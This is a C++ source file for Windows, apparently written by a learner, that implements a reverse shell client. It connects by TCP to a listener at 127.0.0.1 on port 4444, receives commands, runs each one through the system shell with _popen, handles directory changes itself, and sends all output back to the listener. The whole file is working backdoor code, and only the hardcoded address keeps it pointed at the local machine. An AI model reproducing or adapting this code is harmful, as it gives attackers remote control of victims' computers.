#include <iostream> 
#include <winsock2.h>
#include <ws2tcpip.h>
#include <array>
#include <direct.h> // lib for handling directories

#pragma comment(lib, "ws2_32.lib")

using namespace std;

#define SERVER_IP "127.0.0.1"
#define SERVER_PORT "4444"

// initialize win socket
void iniWinSocket() {
    // stores data about windows socket implementation
    WSADATA wsaData;
    int result = WSAStartup(MAKEWORD(2,2), &wsaData);

    if(result != 0) {
        cerr << "WSAStartup failed." << endl;
        exit(1);
    }
}

// creating client socket
SOCKET createClientSocket() {
    struct addrinfo *result = NULL;
    struct addrinfo hints;
    
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;    // means we want to use TCP based connection
    hints.ai_protocol = IPPROTO_TCP;
    // we do not include AI_PASSIVE because client side code should only connect to listener, and not listen for connections 

    int iResult = getaddrinfo(SERVER_IP, SERVER_PORT, &hints, &result);
    if(iResult != 0) {
        cerr << "Get Address Info failed." << endl;
        exit(1);
    }
    // creating the socket
    SOCKET clientSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if(clientSocket == INVALID_SOCKET) {
        cerr << "Socket creation failed." << endl;
        exit(1);
    }
    // connecting to server
    int connectionResult = connect(clientSocket, result->ai_addr, (int)result->ai_addrlen);   // address of the IP and port of target
    if(connectionResult == SOCKET_ERROR) {
        cerr << "Connection failed." << endl;
        exit(1);
    }
    return clientSocket;
}

// void receiveMessage(SOCKET clientSocket) {
//     //creating a buffer for temp storage
//     char buffer[512]; // can hold 512 bytes of data from server side code
//     int iResult = recv(clientSocket, buffer, sizeof(buffer), 0);

//     if(iResult > 0) {
//         buffer[iResult] = '\0'; // terminates string when reaching end, add 0 because we are working with c style string
//         cout << "Server message: " << buffer << endl;
//     }else if (iResult == 0) {
//         cout << "Connection Closed" << endl;
//     }
//     else {
//         cerr << "Recv failed." << endl;
//     }

// }

// execute shell command and capture output
string executeCommand(const string &command) {
    // buffer with 128 bytes of size which holds the output from command
    array <char, 128> buffer;
    string result;

    // opens a pipe to execute a shell command, and returns the command in c string format, and reads the output
    FILE *pipe = _popen(command.c_str(), "r");
    if(!pipe) {
        return "Command execution failed.";
    }

    // fgets help us read a line from the pipe stream and saves it into buffer data. Buffer size shows how much we can store. Pipe is the string in which output written
    while(fgets(buffer.data(), buffer.size(), pipe) != nullptr) {
        result += buffer.data(); // appends output of buffer into result
    }
    _pclose(pipe);
    return result;
}

// continuously receive commands
void handleServerCommand(SOCKET clientSocket) {
    while(true) {
        char buffer[1024];
        int iResult = recv(clientSocket, buffer, sizeof(buffer) -1, 0);
        
        // indicates if we are receiving results, and then terminates once the end of command is reached
        if(iResult > 0) {
            buffer[iResult] = '\0';
        
            string command(buffer);

            if(command == "exit") break;

            // rfind verifies if command starts with cd
            if(command.rfind("cd", 0) == 0) {
                string newDir = command.substr(3);     // command starts from cd, which is the 0 position.This means that our new directories start from third character
                if(_chdir(newDir.c_str()) == 0) {
                    // getting current directory
                    char currentDir[1024];
                    if(_getcwd(currentDir, sizeof(currentDir))) {
                        string Message = "Director changed to " + string(currentDir) + "\n";
                        send(clientSocket, Message.c_str(), Message.length(), 0);
                    }
                    else {
                        send(clientSocket, "Directory changed but failed to retrieve new directory.\n", 57, 0);
                    }
                }
                else {
                    send(clientSocket, "Failed to change directory.\n", 29, 0);
                }
            }
            else {
                 // executes command and sends the result to server side 
                string result = executeCommand(command);
                send(clientSocket, result.c_str(), result.length(), 0);                
            }

        }else if(iResult == 0) {
            cout << "Connection closed." << endl;
            break;
        }else {
            cerr << "Recv failed." << endl;
            break;
        }
    }
}

int main() {

    iniWinSocket();
    SOCKET clientSocket = createClientSocket();
    cout << "Connected to the server" << endl;

    handleServerCommand(clientSocket);
    
    // receiveMessage(clientSocket);
   
  

    return 0;
}